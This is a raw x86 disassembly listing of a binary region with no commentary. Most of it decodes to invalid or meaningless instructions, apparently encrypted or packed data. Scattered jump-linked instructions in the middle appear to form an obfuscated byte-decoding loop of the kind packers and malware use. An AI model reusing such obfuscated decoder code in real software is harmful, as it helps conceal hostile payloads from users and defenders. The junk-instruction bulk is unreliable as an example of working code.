  4059c0:	int3   
  4059c1:	scas   eax,DWORD PTR es:[edi]
  4059c2:	dec    eax
  4059c3:	pop    esp
  4059c4:	mov    ecx,0xf0c7837c
  4059c9:	inc    esp
  4059ca:	cmp    al,0xd2
  4059cc:	mov    esi,0x65f5da3
  4059d1:	lock mov dh,0x79
  4059d4:	lock jecxz 0x405982
  4059d7:	mov    al,ds:0xfaf69ff2
  4059dc:	out    dx,al
  4059dd:	dec    eax
  4059de:	push   0x3bb475f2
  4059e3:	mov    ch,0x2e
  4059e5:	push   es
  4059e6:	(bad)  
  4059e7:	loopne 0x405a20
  4059e9:	clc    
  4059ea:	out    0xed,al
  4059ec:	(bad)  
  4059ed:	inc    edx
  4059ee:	cmc    
  4059ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059f0:	dec    esp
  4059f1:	pop    ss
  4059f2:	mov    eax,0xbbbb2dfd
  4059f7:	xchg   ebp,eax
  4059f8:	pop    eax
  4059f9:	sar    bh,cl
  4059fb:	outs   dx,DWORD PTR ds:[esi]
  4059fc:	rol    DWORD PTR ss:[eax],cl
  4059ff:	out    dx,eax
  405a00:	retf   
  405a01:	or     ecx,DWORD PTR ds:0x71e0b4bb
  405a07:	adc    BYTE PTR [eax],0x88
  405a0a:	dec    eax
  405a0b:	dec    esi
  405a0c:	xchg   esi,eax
  405a0d:	ins    DWORD PTR es:[edi],dx
  405a0e:	adc    DWORD PTR [eax+0x18],edi
  405a11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a12:	dec    esi
  405a13:	mov    BYTE PTR [edx],cl
  405a15:	into   
  405a16:	iret   
  405a17:	iret   
  405a18:	push   edi
  405a19:	sub    eax,0xaf1920b4
  405a1e:	call   0x8dd4:0x42b014d
  405a25:	xchg   edx,eax
  405a26:	xchg   edx,eax
  405a27:	and    ebx,DWORD PTR [ecx+0x4c]
  405a2a:	xchg   dh,cl
  405a2c:	je     0x405a47
  405a2e:	sbb    dl,BYTE PTR [edi+ebx*4-0x1374d7d1]
  405a35:	mov    edx,0xb463131e
  405a3a:	xchg   BYTE PTR [edi*1-0x5263d093],cl
  405a41:	xlat   BYTE PTR ds:[ebx]
  405a42:	pop    es
  405a43:	rcl    BYTE PTR [ecx-0x46],1
  405a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a47:	out    dx,eax
  405a48:	or     eax,0xa2fc4479
  405a4d:	jecxz  0x4059f6
  405a4f:	out    0x41,al
  405a51:	pushf  
  405a52:	or     esi,DWORD PTR [edi]
  405a54:	adc    dl,BYTE PTR [ebx+ebp*4]
  405a57:	inc    edx
  405a58:	xchg   esp,eax
  405a59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a5a:	gs pop esi
  405a5c:	pop    ebx
  405a5d:	push   0x1d
  405a5f:	jno    0x405a0e
  405a61:	cmp    bl,al
  405a63:	(bad)  
  405a64:	imul   eax,ebp,0xfbf52a08
  405a6a:	jge    0x405ad5
  405a6c:	retf   
  405a6d:	pusha  
  405a6e:	ret    
  405a6f:	mov    dh,0xd
  405a71:	mov    dl,0x73
  405a73:	mov    edi,0x93540534
  405a78:	xchg   esi,eax
  405a79:	repnz inc edi
  405a7b:	(bad)  
  405a7d:	in     al,dx
  405a7e:	daa    
  405a7f:	(bad)  
  405a80:	push   ebp
  405a81:	lock mov ds:0xedb7a042,eax
  405a87:	lock inc edi
  405a89:	nop
  405a8a:	dec    edx
  405a8b:	lea    esp,[edx-0x75eeb0f9]
  405a91:	mov    DWORD PTR [edi-0x4c],edx
  405a94:	cmc    
  405a95:	test   al,0x54
  405a97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a98:	xor    ah,al
  405a9a:	retf   
  405a9b:	leave  
  405a9c:	cs pop esp
  405a9e:	push   ecx
  405a9f:	aas    
  405aa0:	jmp    0x2018:0xaf9ef8c7
  405aa7:	leave  
  405aa8:	icebp  
  405aa9:	icebp  
  405aaa:	inc    esi
  405aab:	aad    0xa7
  405aad:	xchg   ebp,eax
  405aae:	jge    0x405ab5
  405ab0:	out    dx,eax
  405ab1:	fnstsw WORD PTR [edi-0x1c0e4cf]
  405ab7:	mov    esp,0x79b0bdb0
  405abc:	stos   BYTE PTR es:[edi],al
  405abd:	sub    eax,ecx
  405abf:	std    
  405ac0:	loopne 0x405ae2
  405ac2:	js     0x405a5b
  405ac4:	mov    esi,0x31e6795a
  405ac9:	push   ecx
  405aca:	iret   
  405acb:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  405acd:	xchg   bl,cl
  405acf:	inc    ebp
  405ad0:	test   BYTE PTR [esp+esi*4],ah
  405ad3:	jbe    0x405b05
  405ad5:	ja     0x405b2d
  405ad7:	iret   
  405ad8:	mov    bh,ah
  405ada:	dec    ecx
  405adb:	push   eax
  405adc:	out    dx,eax
  405add:	push   cs
  405ade:	lds    ecx,FWORD PTR [ecx-0x6c]
  405ae1:	add    al,0xef
  405ae3:	mov    edx,0x38653046
  405ae8:	pop    es
  405ae9:	out    dx,al
  405aea:	pop    ecx
  405aeb:	xchg   al,ch
  405aed:	shr    ecx,cl
  405aef:	test   eax,0x4db638d8
  405af5:	adc    eax,0x4725a7f2
  405afa:	push   eax
  405afb:	sahf   
  405afc:	sub    ah,ah
  405afe:	mov    esi,0x70d22c19
  405b03:	gs lahf 
  405b05:	pop    eax
  405b06:	pop    edx
  405b07:	cmp    dl,ah
  405b09:	push   edx
  405b0a:	mov    DWORD PTR [eax-0x36],esi
  405b0d:	push   esi
  405b0e:	fisubr WORD PTR [esi]
  405b10:	mov    BYTE PTR [eax],dl
  405b12:	inc    edi
  405b13:	and    dh,BYTE PTR [eax-0xfcde89f]
  405b19:	pop    es
  405b1a:	sbb    BYTE PTR [ebp-0x69],0xd5
  405b1e:	cmp    eax,0x6440b4e8
  405b23:	jae    0x405b80
  405b25:	push   ebp
  405b26:	mov    bl,0xec
  405b28:	pop    edi
  405b29:	nop
  405b2a:	inc    esi
  405b2b:	jecxz  0x405ace
  405b2d:	jne    0x405aaf
  405b2f:	sti    
  405b30:	inc    edi
  405b31:	push   ss
  405b32:	push   ebx
  405b33:	ja     0x405bb4
  405b35:	mov    DWORD PTR [ecx],edi
  405b37:	mov    eax,ds:0x3dbee8e6
  405b3c:	or     eax,0x509b8888
  405b41:	cli    
  405b42:	jp     0x405af9
  405b44:	cmp    al,0xcd
  405b46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b47:	loop   0x405ad5
  405b49:	enter  0xc620,0x3d
  405b4d:	in     eax,0xe1
  405b4f:	sbb    DWORD PTR [eax+0x34],edx
  405b52:	ins    BYTE PTR es:[edi],dx
  405b53:	icebp  
  405b54:	jb     0x405baf
  405b56:	push   0x3593e346
  405b5b:	(bad)  
  405b5c:	aad    0xb1
  405b5e:	into   
  405b5f:	sar    BYTE PTR [ebx-0x14],cl
  405b62:	mov    esp,0x996788dc
  405b67:	dec    edi
  405b68:	sbb    eax,0xfcccb3a4
  405b6d:	sahf   
  405b6e:	sbb    DWORD PTR [ebx+eiz*2-0x58564d67],esp
  405b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b76:	cmp    eax,esi
  405b78:	(bad)  
  405b79:	not    DWORD PTR [eax+0x4355094c]
  405b7f:	sub    eax,0x58549872
  405b84:	pop    ecx
  405b85:	popf   
  405b86:	sub    eax,0xc006d31f
  405b8b:	ret    
  405b8c:	fbld   TBYTE PTR [edi+0xf940a0f]
  405b92:	retf   
  405b93:	mov    ds:0x95fd11c4,al
  405b98:	pop    ecx
  405b99:	mov    ebp,0x8fdfc6ef
  405b9e:	pop    ebx
  405b9f:	(bad)  [ecx-0x1e]
  405ba2:	adc    al,0x82
  405ba4:	cmp    eax,0xe777313b
  405ba9:	and    bh,cl
  405bab:	sbb    BYTE PTR [esi+0x429c44e6],bh
  405bb1:	and    DWORD PTR [esi-0x1d1d49e8],ebx
  405bb7:	sub    BYTE PTR [edi+ebp*8+0x6e3ab303],0xa5
  405bbf:	inc    esp
  405bc0:	mov    ds:0x748270f,eax
  405bc5:	lods   al,BYTE PTR ds:[esi]
  405bc6:	sub    esi,DWORD PTR [ecx+0x2a]
  405bc9:	fistp  DWORD PTR [ecx]
  405bcb:	jecxz  0x405c32
  405bcd:	or     DWORD PTR [esi-0xe71d129],esp
  405bd3:	sar    esp,cl
  405bd5:	std    
  405bd6:	daa    
  405bd7:	arpl   WORD PTR [ecx+0x4c4c697],dx
  405bdd:	xchg   BYTE PTR [esi],bh
  405bdf:	jmp    0xbe4f:0xcc92c748
  405be6:	jae    0x405c3d
  405be8:	clc    
  405be9:	(bad)  
  405beb:	mov    esp,0x82791295
  405bf0:	pop    ecx
  405bf1:	idiv   DWORD PTR [ecx-0x1d]
  405bf4:	sub    DWORD PTR [ebx],ecx
  405bf6:	(bad)  
  405bf7:	(bad)  
  405bf8:	xlat   BYTE PTR ds:[ebx]
  405bf9:	cs jo  0x405baf
  405bfc:	pop    esp
  405bfd:	icebp  
  405bfe:	lds    edi,FWORD PTR [esi]
  405c00:	js     0x405bba
  405c02:	and    eax,edx
  405c04:	lods   al,BYTE PTR ds:[esi]
  405c05:	fsubr  DWORD PTR [eax-0x5bd5efa]
  405c0b:	fincstp 
  405c0d:	or     bl,BYTE PTR [ebx+0x7d03f82b]
  405c13:	adc    BYTE PTR [ebx],dh
  405c15:	rol    DWORD PTR [ebx],1
  405c17:	(bad)  
  405c18:	cmp    edx,edi
  405c1a:	ja     0x406428
  405c20:	push   ebx
  405c21:	jmp    0x405c2b
  405c26:	mov    esi,0x32729d
  405c2b:	mov    eax,DWORD PTR [ebp-0x8]
  405c2e:	mov    edi,DWORD PTR [ebp-0x4]
  405c31:	xor    edi,ecx
  405c33:	jmp    0x40600f
  405c38:	test   DWORD PTR [edx-0x7c],0x79ec5dea
  405c3f:	arpl   WORD PTR ds:0x155d0ed0,dx
  405c45:	jl     0x405c03
  405c47:	jno    0x405c99
  405c49:	cmp    edi,DWORD PTR [esi+0x7e]
  405c4c:	mov    ebp,0x1a7e7e71
  405c51:	mov    ah,0x95
  405c53:	loope  0x405c1a
  405c55:	shr    BYTE PTR ds:[ecx],0x51
  405c59:	mov    DWORD PTR [ebx+0x2a7395ab],0xa7adc440
  405c63:	inc    esp
  405c64:	add    cl,0x1f
  405c67:	clc    
  405c68:	sti    
  405c69:	push   es
  405c6a:	out    0xdd,eax
  405c6c:	jle    0x405c2c
  405c6e:	inc    esp
  405c6f:	rol    BYTE PTR [esi-0x7e],cl
  405c72:	mov    ah,0xc
  405c74:	sbb    dh,dl
  405c76:	gs jl  0x405c7d
  405c79:	push   edi
  405c7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405c7b:	push   ds
  405c7c:	dec    edx
  405c7d:	jnp    0x405c92
  405c7f:	cmp    al,0xdd
  405c81:	xchg   ecx,eax
  405c82:	pop    es
  405c83:	rcl    BYTE PTR [ecx],cl
  405c85:	jnp    0x405cad
  405c87:	pop    ecx
  405c88:	pop    eax
  405c89:	jo     0x405ca1
  405c8b:	idiv   DWORD PTR ds:0xbec44ecd
  405c91:	xor    BYTE PTR [ebp+0x10],ch
  405c94:	sub    BYTE PTR [ecx-0x75],bl
  405c97:	xchg   edi,eax
  405c98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c99:	mov    esi,0xa67bcff
  405c9e:	daa    
  405c9f:	xor    BYTE PTR [eax+0x30],0xe9
  405ca3:	sti    
  405ca4:	or     ebp,ecx
  405ca6:	outs   dx,BYTE PTR ds:[esi]
  405ca7:	inc    ebp
  405ca8:	enter  0x5dd0,0xc6
  405cac:	mov    ebx,0x95bfd616
  405cb1:	pop    esi
  405cb2:	and    DWORD PTR [esi+0x5b5e0660],edx
  405cb8:	jl     0x405cc3
  405cba:	in     al,dx
  405cbb:	cmp    BYTE PTR [ebx-0x23],ah
  405cbe:	xor    eax,0x92a7a69a
  405cc3:	jecxz  0x405d00
  405cc5:	into   
  405cc6:	outs   dx,DWORD PTR ds:[esi]
  405cc7:	fs mov dh,0x7e
  405cca:	pop    ds
  405ccb:	mov    edx,0x7824fbcb
  405cd0:	outs   dx,BYTE PTR ds:[esi]
  405cd2:	aas    
  405cd3:	pop    esp
  405cd4:	jo     0x405c84
  405cd6:	jmp    0x405d03
  405cd8:	mov    dh,0x1
  405cda:	adc    DWORD PTR [edx+ebx*8+0x4],ebp
  405cde:	mov    al,0xb2
  405ce0:	jmp    0x405d3c
  405ce2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ce3:	jbe    0x405cb8
  405ce5:	stc    
  405ce6:	mov    al,ds:0x2fd052a9
  405ceb:	inc    edi
  405cec:	jge    0x405cad
  405cee:	jmp    0x5c8c3208
  405cf3:	std    
  405cf4:	stos   DWORD PTR es:[edi],eax
  405cf5:	add    bl,ah
  405cf7:	inc    ebx
  405cf8:	loop   0x405c88
  405cfa:	dec    ebp
  405cfb:	add    al,0xda
  405cfd:	aas    
  405cfe:	push   ds
  405cff:	or     DWORD PTR [ebx],edx
  405d01:	mov    eax,0x95c6fd8f
  405d06:	sahf   
  405d07:	mov    esp,0xa54e4d48
  405d0c:	js     0x405d00
  405d0e:	popf   
  405d0f:	cmp    edx,DWORD PTR [ebx+eiz*4+0x523f755b]
  405d16:	inc    esi
  405d17:	mov    dh,0xf5
  405d19:	test   al,0x72
  405d1b:	or     DWORD PTR [ecx],esp
  405d1d:	mov    eax,0xc7666bdf
  405d22:	jns    0x405ceb
  405d24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d25:	aas    
  405d26:	imul   edi,DWORD PTR [edx],0xfffffffe
  405d29:	ret    
  405d2a:	jge    0x405d7f
  405d2c:	mov    ecx,0xdd67fe4
  405d31:	enter  0xe021,0x90
  405d35:	or     eax,0x894fe572
  405d3a:	das    
  405d3b:	sahf   
  405d3c:	inc    eax
  405d3d:	dec    eax
  405d3e:	sub    al,0x4c
  405d40:	or     eax,edi
  405d42:	retf   
  405d43:	rol    DWORD PTR [edi-0x4d66249d],cl
  405d49:	out    0x7c,al
  405d4b:	dec    ebp
  405d4c:	mov    ds:0x6badab37,al
  405d51:	mov    edi,eax
  405d53:	xchg   DWORD PTR [ebp-0x5f],ecx
  405d56:	in     al,dx
  405d57:	mov    es,WORD PTR [edi+0x4ab094e4]
  405d5d:	mov    al,0x10
  405d5f:	mov    ecx,0x1b8cd889
  405d64:	cmp    eax,0x20464ef8
  405d69:	pop    ds
  405d6a:	lds    esp,FWORD PTR [edi]
  405d6c:	cdq    
  405d6d:	jno    0x405de0
  405d6f:	lds    ecx,FWORD PTR [ebp+0x62]
  405d72:	pop    ds
  405d73:	pop    ss
  405d74:	mov    esi,0x9b89e998
  405d79:	fnstenv [ebx]
  405d7b:	ds cs popa 
  405d7e:	sub    BYTE PTR ds:0xc1bdfb54,0xaf
  405d85:	lods   al,BYTE PTR ds:[esi]
  405d86:	sub    BYTE PTR [esi],dl
  405d88:	shl    DWORD PTR [ebx],1
  405d8a:	inc    al
  405d8c:	mov    eax,ds:0xa5c95487
  405d91:	pusha  
  405d92:	(bad)  
  405d94:	sub    DWORD PTR [edi+0x3],edi
  405d97:	in     al,dx
  405d98:	call   0xcd0e1ca6
  405d9d:	fcmovnb st,st(1)
  405d9f:	and    eax,0x3a1f40e
  405da4:	ds stos BYTE PTR es:[edi],al
  405da6:	push   0x45
  405da8:	push   cs
  405da9:	sahf   
  405daa:	ds dec ebx
  405dac:	xchg   ecx,eax
  405dad:	dec    esp
  405dae:	std    
  405daf:	dec    edx
  405db0:	(bad)  
  405db1:	dec    edx
  405db2:	add    esi,esi
  405db4:	add    BYTE PTR [edx],0x21
  405db7:	xor    eax,0x6507bf93
  405dbc:	adc    bh,BYTE PTR [esi-0x6a]
  405dbf:	inc    ecx
  405dc0:	ffreep st(1)
  405dc2:	push   cs
  405dc3:	xchg   DWORD PTR [eax+0x60e20ec9],edx
  405dc9:	adc    al,0x4b
  405dcb:	fisub  WORD PTR [esi]
  405dcd:	pusha  
  405dce:	cmp    al,0x9e
  405dd0:	rcr    ebp,1
  405dd2:	mov    ds:0x98595e5a,al
  405dd7:	outs   dx,DWORD PTR ds:[esi]
  405dd8:	(bad)  
  405dd9:	mov    ecx,0x8b9d5e8d
  405dde:	leave  
  405ddf:	mov    DWORD PTR [edi-0x6],eax
  405de2:	in     eax,dx
  405de3:	fwait
  405de4:	pop    esp
  405de5:	ins    DWORD PTR es:[edi],dx
  405de6:	cmovge eax,DWORD PTR [eax+0x24]
  405dea:	in     al,0xfc
  405dec:	call   0xcd644599
  405df1:	ss loopne 0x405db6
  405df4:	or     esp,DWORD PTR ds:0x4877bee3
  405dfa:	xchg   DWORD PTR [edi-0x37],eax
  405dfd:	jle    0x405e4e
  405dff:	ins    BYTE PTR es:[edi],dx
  405e00:	dec    esi
  405e01:	inc    eax
  405e02:	arpl   WORD PTR [ecx+0x2a],bp
  405e05:	imul   ebp,DWORD PTR [ebx+0x34ed79aa],0x24f2834e
  405e0f:	ins    DWORD PTR es:[edi],dx
  405e10:	ror    BYTE PTR [eax+eax*1+0x70fcb53],0xaa
  405e18:	jg     0x405e15
  405e1a:	ins    BYTE PTR es:[edi],dx
  405e1b:	repz ds push edx
  405e1e:	fiadd  DWORD PTR [edx-0x84eb072]
  405e24:	sbb    ch,bl
  405e26:	jp     0x405e5f
  405e28:	add    DWORD PTR [esp+ebx*8-0x3255c281],esi
  405e2f:	push   ebx
  405e30:	retf   0x527f
  405e33:	dec    ebx
  405e34:	fld    QWORD PTR [edx]
  405e36:	(bad)  
  405e38:	lahf   
  405e39:	push   eax
  405e3a:	in     al,0x54
  405e3c:	push   ecx
  405e3d:	or     al,0x7f
  405e3f:	mov    bl,0xee
  405e41:	inc    ebp
  405e42:	mov    al,ds:0x2830cc6
  405e47:	jl     0x405e3a
  405e49:	(bad)  
  405e4a:	sub    ah,BYTE PTR [ebx+0x26cde971]
  405e50:	xor    eax,0x4be6a6c
  405e55:	inc    ebp
  405e56:	pop    esp
  405e57:	adc    esi,DWORD PTR [ebp-0x17c5f7e5]
  405e5d:	mov    ecx,0x25890175
  405e62:	mov    ecx,DWORD PTR [ecx]
  405e64:	imul   ebp,DWORD PTR [edi-0x4fe00a7c],0x6a00f8bb
  405e6e:	cmp    eax,0xef5e3674
  405e73:	mov    al,ds:0xf1e8c0f5
  405e78:	xor    al,0x23
  405e7a:	add    DWORD PTR [ebx+0x5806e03c],0x96a153fc
  405e84:	xchg   esi,eax
  405e85:	imul   esi,DWORD PTR [ecx],0x43a274f0
  405e8b:	sbb    ebx,DWORD PTR [esi-0x4]
  405e8e:	push   0x17
  405e90:	pop    ebp
  405e91:	push   eax
  405e92:	fdivrp st(4),st
  405e94:	(bad)  
  405e95:	jmp    0x8c3348b5
  405e9a:	shl    DWORD PTR [edx+0x18d2321b],0xe3
  405ea1:	dec    ebp
  405ea2:	cmp    edi,esp
  405ea4:	stos   DWORD PTR es:[edi],eax
  405ea5:	dec    ebp
  405ea6:	mov    al,ds:0x76a870df
  405eab:	jb     0x405e3a
  405ead:	push   esp
  405eae:	into   
  405eaf:	pop    edx
  405eb0:	and    al,0xf5
  405eb2:	jecxz  0x405ef7
  405eb4:	and    eax,0x37beddf0
  405eb9:	das    
  405eba:	cmp    al,0x70
  405ebc:	xor    edi,DWORD PTR [eax]
  405ebe:	cmp    dl,bh
  405ec0:	pop    edi
  405ec1:	pushf  
  405ec2:	outs   dx,BYTE PTR ds:[esi]
  405ec3:	push   ebp
  405ec4:	stos   BYTE PTR es:[edi],al
  405ec5:	outs   dx,BYTE PTR ds:[esi]
  405ec7:	test   eax,0xebfb29c
  405ecc:	nop
  405ecd:	xchg   ecx,eax
  405ece:	clc    
  405ecf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ed0:	mov    ds:0x55519d62,eax
  405ed5:	and    al,0xec
  405ed7:	loop   0x405f2a
  405ed9:	inc    eax
  405eda:	push   0x4ed7ca1b
  405edf:	xor    al,0x35
  405ee1:	arpl   WORD PTR [esi],bx
  405ee3:	rcr    DWORD PTR [esi],0x25
  405ee6:	pusha  
  405ee7:	dec    edx
  405ee8:	pop    ebx
  405ee9:	ja     0x405efb
  405eeb:	cs pop edx
  405eed:	idiv   DWORD PTR [esi-0x10]
  405ef0:	jmp    0x4498:0x93680936
  405ef7:	lods   eax,DWORD PTR ds:[esi]
  405ef8:	or     ecx,0xfffffff4
  405efb:	mov    al,0x41
  405efd:	xchg   BYTE PTR [edx],bl
  405eff:	xchg   ecx,eax
  405f00:	(bad)  
  405f01:	mov    eax,0xd28fb43d
  405f06:	in     eax,0xad
  405f08:	jmp    DWORD PTR [eax-0x3e22382e]
  405f0e:	pop    ebp
  405f0f:	outs   dx,DWORD PTR ds:[esi]
  405f10:	scas   al,BYTE PTR es:[edi]
  405f11:	add    al,0xab
  405f13:	ret    0x4de6
  405f16:	push   0x25d1b6f1
  405f1b:	cmp    al,0xe0
  405f1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f1e:	rcl    DWORD PTR [ebp-0x47],1
  405f21:	mov    esp,0x6b8589b4
  405f26:	xor    al,0x8c
  405f28:	ins    DWORD PTR es:[edi],dx
  405f29:	sbb    eax,0xb3201296
  405f2e:	cmc    
  405f2f:	pop    ebp
  405f30:	xchg   esi,eax
  405f31:	aas    
  405f32:	push   esi
  405f33:	cmp    eax,0xd3bccfaf
  405f38:	and    ch,cl
  405f3a:	(bad)  
  405f3c:	push   ebp
  405f3d:	outs   dx,BYTE PTR ds:[esi]
  405f3e:	push   esi
  405f3f:	iret   
  405f40:	fadd   QWORD PTR [edi-0x74]
  405f43:	cmp    DWORD PTR [edx+0x6a5ac6ca],ebx
  405f49:	sub    eax,0x1432e31
  405f4e:	add    esi,DWORD PTR [edi-0x5]
  405f51:	inc    ebx
  405f52:	xor    eax,0x60feb9a7
  405f57:	add    eax,0xa8ddf227
  405f5c:	shl    DWORD PTR [ecx+0x20f0cb08],1
  405f62:	jae    0x405f4e
  405f64:	push   ebp
  405f65:	cdq    
  405f66:	mov    bl,0x85
  405f68:	lea    ecx,[edx-0x3ddaa974]
  405f6e:	cmp    al,0x88
  405f70:	jne    0x405f52
  405f72:	js     0x405f2e
  405f74:	jno    0x405fa8
  405f76:	add    al,0xb2
  405f78:	xor    al,0x96
  405f7a:	nop
  405f7b:	hlt    
  405f7c:	popf   
  405f7d:	xor    BYTE PTR [eax+0x70d0d784],ch
  405f83:	test   BYTE PTR [ecx+0x20],ch
  405f86:	xor    al,0xdf
  405f88:	pop    ecx
  405f89:	rol    ebp,cl
  405f8b:	mov    DWORD PTR ds:0x6eafc900,esi
  405f91:	jnp    0x405fab
  405f93:	in     eax,0x38
  405f95:	and    al,0x71
  405f97:	in     eax,0x26
  405f99:	iret   
  405f9a:	push   esi
  405f9b:	repnz adc eax,0x4aa45fca
  405fa1:	jae    0x40601b
  405fa3:	add    al,0x3b
  405fa5:	mov    DWORD PTR [edx+0x41991716],eax
  405fab:	stc    
  405fac:	sub    dl,ch
  405fae:	ficomp WORD PTR [edx+edx*2+0x28b09ecd]
  405fb5:	out    dx,al
  405fb6:	arpl   WORD PTR [ebx+0x4e53438a],di
  405fbc:	pop    ds
  405fbd:	out    0x77,eax
  405fbf:	sbb    BYTE PTR [edi+ecx*2+0x53],ch
  405fc3:	xchg   esp,eax
  405fc4:	sub    DWORD PTR [edi+edi*4-0x4f],esp
  405fc8:	sbb    al,0x25
  405fca:	ud2    
  405fcc:	inc    esp
  405fcd:	inc    edx
  405fce:	mov    al,0x1f
  405fd0:	mov    edx,0x42ed2c90
  405fd5:	fs push esi
  405fd7:	mov    bl,0x49
  405fd9:	(bad)  
  405fdb:	xlat   BYTE PTR ds:[ebx]
  405fdc:	shr    esi,0xa8
  405fdf:	(bad)  
  405fe0:	call   0xaac3:0x3147aa2e
  405fe7:	popf   
  405fe8:	in     al,dx
  405fe9:	adc    ecx,esp
  405feb:	into   
  405fec:	(bad)  
  405fed:	ins    DWORD PTR es:[edi],dx
  405fee:	(bad)  
  405fef:	(bad)  
  405ff1:	adc    edi,DWORD PTR [edi]
  405ff3:	add    BYTE PTR [edi+0x39],bh
  405ff6:	pop    ecx
  405ff7:	in     al,0x63
  405ff9:	(bad)  
  405ffa:	sub    al,0xc8
  405ffc:	(bad)  
  405ffe:	es out dx,al
  406000:	mov    ecx,0x3a03723d
  406005:	jle    0x40607f
  406007:	fisubr WORD PTR [eax+ecx*1+0x34]
  40600b:	loope  0x405faa
  40600d:	xchg   edx,eax
  40600e:	ss add edi,esi
  406011:	mov    esi,DWORD PTR [ebp+0x8]
  406014:	imul   edi,edx
  406017:	mov    ebx,DWORD PTR [ebp+0xc]
  40601a:	xor    eax,ecx
  40601c:	add    eax,edx
  40601e:	mov    al,BYTE PTR [ebx+eax*1+0x32729d]
  406025:	mov    BYTE PTR [edi+esi*1],al
  406028:	mov    eax,DWORD PTR [ebp-0x4]
  40602b:	xor    eax,ecx
  40602d:	lea    edx,[edx+eax*1+0x32729d]
  406034:	mov    eax,DWORD PTR [ebp-0x4]
  406037:	xor    eax,ecx
  406039:	mov    esi,0xffcd8d63
  40603e:	sub    esi,eax
  406040:	add    esi,DWORD PTR [ebp+0x10]
  406043:	cmp    edx,esi
  406045:	jmp    0x406421
  40604a:	fdivr  st(7),st
  40604c:	es fwait
  40604e:	jge    0x40600b
  406050:	jge    0x40609b
  406052:	jae    0x4060cf
  406054:	dec    edx
  406055:	pusha  
  406056:	and    edx,ebx
  406058:	and    ch,BYTE PTR [ebx-0x61]
  40605b:	aas    
  40605c:	jle    0x4060dc
  40605e:	mov    ebp,0xa47e7e71
  406063:	and    BYTE PTR [ebx+0x56],dl
  406066:	pop    edi
  406067:	dec    ebx
  406068:	dec    eax
  406069:	retf   0xe451
  40606c:	and    al,0xd1
  40606e:	adc    al,0xa
  406070:	or     eax,0x48fd2d1f
  406075:	arpl   ax,bp
  406077:	jb     0x406084
  406079:	out    0xc7,eax
  40607b:	xor    esp,edx
  40607d:	cmc    
  40607e:	mov    esi,0x960f04a7
  406083:	popf   
  406084:	clc    
  406085:	pop    edx
  406086:	jg     0x40607f
  406088:	ja     0x4060eb
  40608a:	push   0x34ce1658
  40608f:	aad    0x98
  406091:	dec    edi
  406092:	mov    al,BYTE PTR [ebx-0x6026a11c]
  406098:	bound  edx,QWORD PTR [edi]
  40609a:	js     0x406092
  40609c:	gs push 0xffffff9a
  40609f:	mov    ah,0x9f
  4060a1:	xor    al,0xe2
  4060a3:	jl     0x406034
  4060a5:	cmp    al,0x1a
  4060a7:	sbb    ah,al
  4060a9:	mov    cl,0xa1
  4060ab:	pop    esp
  4060ac:	mov    edx,0x11847ead
  4060b1:	call   0x7a81:0x706503a0
  4060b8:	jns    0x4060da
  4060ba:	add    al,0xff
  4060bc:	push   ebp
  4060bd:	ins    DWORD PTR es:[di],dx
  4060bf:	push   es
  4060c0:	fisttp DWORD PTR [edi-0x64]
  4060c3:	jb     0x40604a
  4060c5:	sub    DWORD PTR [edi+0x61],0x80da2dd2
  4060cc:	jl     0x406140
  4060ce:	cwde   
  4060cf:	retf   0x21dc
  4060d2:	mov    esp,0x5c0f7d67
  4060d7:	imul   eax,DWORD PTR [ecx+0x513b581b],0x4d
  4060de:	aas    
  4060df:	fwait
  4060e0:	sub    eax,0x397e5db
  4060e5:	addr16 (bad) 
  4060e7:	and    BYTE PTR ds:0x84f15ea8,al
  4060ed:	add    al,0x8d
  4060ef:	mov    BYTE PTR [ecx+0x8],dl
  4060f2:	das    
  4060f3:	hlt    
  4060f4:	adc    BYTE PTR [eax],ch
  4060f6:	stc    
  4060f7:	pop    esp
  4060f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4060f9:	pop    esi
  4060fa:	pop    ss
  4060fb:	add    al,0x32
  4060fd:	aas    
  4060fe:	push   edi
  4060ff:	fisubr DWORD PTR [eax+ebp*1+0x58c1917]
  406106:	and    esp,DWORD PTR [esi+0x66]
  406109:	sub    bh,cl
  40610b:	lea    ebp,[edi-0x2b]
  40610e:	xor    esp,ebp
  406110:	fcmove st,st(4)
  406112:	adc    dl,bl
  406114:	xor    bh,BYTE PTR [edx-0x5e]
  406117:	repz inc ebx
  406119:	xor    DWORD PTR [ebp-0x48b96f48],ebp
  40611f:	xchg   ebp,eax
  406120:	sti    
  406121:	out    0x51,al
  406123:	clc    
  406124:	test   al,0x22
  406126:	dec    ebp
  406127:	cmp    ch,BYTE PTR [ecx+0x1be30a76]
  40612d:	inc    eax
  40612e:	sbb    DWORD PTR [edi+0x52],eax
  406131:	iret   
  406132:	inc    esi
  406133:	mov    al,ds:0xb9ff3f21
  406138:	jns    0x406141
  40613a:	ret    
  40613b:	bound  esp,QWORD PTR [eax+0x78]
  40613e:	add    BYTE PTR [esi+ebx*4-0x3ec29e55],bh
  406145:	cmp    eax,0x86bbb55b
  40614a:	sub    dh,dl
  40614c:	into   
  40614d:	cmp    eax,0xe74aa42e
  406152:	mov    al,ds:0x8ab15ba0
  406157:	and    BYTE PTR [ebx],bl
  406159:	mov    dl,0x11
  40615b:	mov    esi,0x86212fe3
  406160:	and    al,0x49
  406162:	mov    ch,0x15
  406164:	push   esp
  406165:	loop   0x40613b
  406167:	sahf   
  406168:	push   eax
  406169:	dec    esi
  40616a:	inc    ecx
  40616b:	add    edi,DWORD PTR [ecx+0x60]
  40616e:	in     al,dx
  40616f:	leave  
  406170:	bound  esi,QWORD PTR [eax+0x7fa38133]
  406176:	jae    0x4061e8
  406178:	fisttp QWORD PTR [edx-0x2e]
  40617b:	jns    0x4061d7
